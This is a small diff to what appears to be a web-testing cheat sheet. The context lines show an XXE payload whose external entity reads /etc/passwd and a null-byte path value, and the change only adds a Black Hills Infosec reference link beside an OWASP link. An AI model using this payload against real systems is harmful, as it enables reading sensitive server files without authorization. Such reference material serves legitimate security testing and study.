@@ -59,8 +59,10 @@ Bypass XML:
 <?xml version="1.0"?>
 <!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <xml>
-  <stuff>&xxe;</stuff>
-</xml>    -  https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing - Read more
+  <stuff>&xxe;</stuff> 
+</xml>    
+https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/ - Read more
+https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing - Read more
 
 null:
 path%00
